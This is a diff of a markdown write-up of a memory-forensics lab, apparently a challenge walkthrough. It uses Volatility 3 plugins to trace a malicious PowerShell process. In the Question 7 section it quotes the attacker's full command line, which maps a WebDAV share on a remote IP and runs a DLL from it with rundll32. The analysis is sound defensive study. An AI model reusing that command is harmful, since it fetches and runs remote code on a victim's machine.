@@ -29,23 +29,23 @@ python3 ~/volatility3/vol.py -f temp_extract_dir/192-Reveal.dmp windows.info
 
 I am now prepared to begin the investigation. As an investigator, I must ask myself three key questions to guide my efforts:
 
-- What am I looking for? (e.g., a specific type of filename, a username)
-- Where will I find the attack evidence? (e.g., memory, host-based, network)
-- How can I manipulate the data to see it?
+1. What am I looking for? (e.g., a specific type of filename, a username)
+2. Where will I find the attack evidence? (e.g., memory, host-based, network)
+3. How can I manipulate the data to see it?
 
 ## Question 1
 
 Question 1: Identifying the name of the malicious process helps in understanding the nature of the attack. What is the name of the malicious process?
 
-What am I looking for?
+1. What am I looking for?
 
 I am searching for a suspicious process that appears normal in the memory dump, so I first need to understand what a typical process looks like. The first page of this [SANS Threat Hunting Poster](/assets/documents/SANS_DFPS_FOR508.pdf) lists common processes and the number of instances usually found in any Windows memory dump.
 
-Where will I find the attack evidence?
+2. Where will I find the attack evidence?
 
 Given that I have a memory dump, I can locate this in the process list, process tree, or even examine process command lines for further insights.
 
-How can I manipulate the data to see it?
+3. How can I manipulate the data to see it?
 
 Volatility 3 provides various plugins to manually or automatically analyze this data. In particular, I will use the malfind plugin, which is highly effective for locating suspicious processes.
 
@@ -63,15 +63,15 @@ I have identified a mention of a PowerShell process with a PID of 3692, which ra
 
 Question 2: Knowing the parent process ID (PPID) of the malicious process aids in tracing the process hierarchy and understanding the attack flow. What is the parent PID of the malicious process?
 
-What am I looking for?
+1. What am I looking for?
 
 Identify the parent of the malicious process to understand the process chain or process tree, helping me trace back to the origin of the compromise.
 
-Where will I find the attack evidence?
+2. Where will I find the attack evidence?
 
 In a memory dump, process trees are structured in a hierarchical form where processes are organized with parent-child relationships, as they are created in a tree format within Windows memory. This allows me to see multiple processes connected by these relationships, helping me trace the flow of activity through parent and child processes.
 
-How can I manipulate the data to see it?
+3. How can I manipulate the data to see it?
 
 One essential plugin for this task is windows.pstree, which helps me visualize processes in a tree structure, showing both parent and child relationships. To use this plugin, I can run:
 
@@ -93,15 +93,15 @@ My analysis reveals that the parent of the malicious PowerShell process (PID 369
 
 Question 3, 4, and 5: What is the filename the malware uses to execute the second-stage payload, the name of the shared directory accessed on the remote server, and the MITRE sub-technique ID associated with this execution method?
 
-What am I looking for?
+1. What am I looking for?
 
 I am looking for details about the malicious second-stage payload executed by the suspicious PowerShell process. Specifically, this includes information on the second-stage payload itself, the shared directory being accessed on the remote server, and the associated MITRE ID for this malicious activity. Identifying these details will help me understand the techniques employed by the malware sample.
 
-Where will I find the attack evidence?
+2. Where will I find the attack evidence?
 
 The command line used by the malicious process can reveal valuable information, helping me pinpoint the scope and techniques used in the attack.
 
-How can I manipulate the data to see it?
+3. How can I manipulate the data to see it?
 
 Volatility includes a powerful plugin that is highly useful in investigations, as it displays the exact command line executed by each process—an essential resource for analysts. I can apply this plugin to specifically target the malicious PowerShell process, providing detailed insights into its execution behavior.
 
@@ -138,15 +138,15 @@ MITRE ATT&CK Context:
 
 Question 6: Identifying the username under which the malicious process runs helps in assessing the compromised account and its potential impact. What is the username that the malicious process runs under?
 
-What am I looking for?
+1. What am I looking for?
 
 I am seeking to identify the username under which this malicious process is running, as this helps me understand the scope of the attack, assess if other users may be affected by the malware, and determine the privileges associated with the compromised user.
 
-Where will I find the attack evidence?
+2. Where will I find the attack evidence?
 
 The Security Identifiers (SIDs) associated with a malicious process are unique identifiers assigned to users, groups, and system entities for identification and access control. These SIDs define the identity and privileges of a user, enabling security management by linking each SID to specific permissions and roles.
 
-How can I manipulate the data to see it?
+3. How can I manipulate the data to see it?
 
 The windows.getsids.GetSIDs plugin in Volatility is invaluable for parsing user data from memory dumps based on their SIDs. This plugin extracts and displays Security Identifiers (SIDs) linked to processes in a Windows memory dump, allowing analysts to identify user accounts, groups, and permissions for each process. To use it, run:
 
@@ -173,17 +173,17 @@ With membership in both Administrators and Domain Users groups, the user "Elon" 
 
 Question 7: Knowing the name of the malware family is essential for correlating the attack with known threats and developing appropriate defenses. What is the name of the malware family?
 
-What am I looking for?
+1. What am I looking for?
 
 I am looking to identify the malware family involved in this attack. Knowing the specific malware family helps us as investigators understand the capabilities of the malicious activity, assess the potential breach scope, and determine other potentially infected machines.
 
-Where will I find the attack evidence?
+2. Where will I find the attack evidence?
 
 Threat Intelligence reports are valuable resources for understanding the capabilities of specific malware families. Additionally, I have Indicators of Compromise (IOCs), such as IP addresses and file hashes, which can be used to search for the malware on sandboxed environments and in threat intelligence reports.
 
-How can I manipulate the data to see it?
+3. How can I manipulate the data to see it?
 
-Returning to the suspicious PowerShell command : powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
+Returning to the suspicious PowerShell command : `powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry`
 - This command suggests the use of a remote IP address (45.9.74.32) to download a potentially malicious payload as we discussed before.
 
 To gather more information, I will submit the IP address (45.9.74.32) to a threat intelligence platform such as VirusTotal. Upon submission, it is revealed that this IP is flagged by 14 out of 95 security vendors and sandbox environments, indicating its association with malicious activity.
